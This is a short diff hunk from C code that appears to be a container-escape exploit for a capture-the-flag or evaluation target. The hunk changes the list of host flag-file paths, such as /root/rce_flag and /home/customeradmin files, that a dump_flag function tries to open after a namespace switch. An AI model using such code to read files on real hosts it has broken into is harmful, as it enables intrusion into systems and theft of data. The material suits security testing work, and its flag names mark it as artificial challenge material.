@@ -145,8 +145,8 @@ void try_setns(const char *ns, int flags) {
 }
 void dump_flag() {
     char *paths[] = {
-        "/root/host_rce", "/home/customeradmin/host_rce", "/root/flags", "/flag.txt",
-        "/addresses", "/home/customeradmin/addresses", "/root/addresses", NULL
+        "/root/rce_flag", "/home/customeradmin/rce_flag", "/rce_flag", "rce_flat",
+        "/root/rce_flag.txt", "/home/customeradmin/rce_flag.txt", "/rce_flag.txt", "rce_flag.txt", NULL
     };
     for (char **path = paths; *path; path++) {
         int fd = open(*path, O_RDONLY); if (fd < 0) continue;
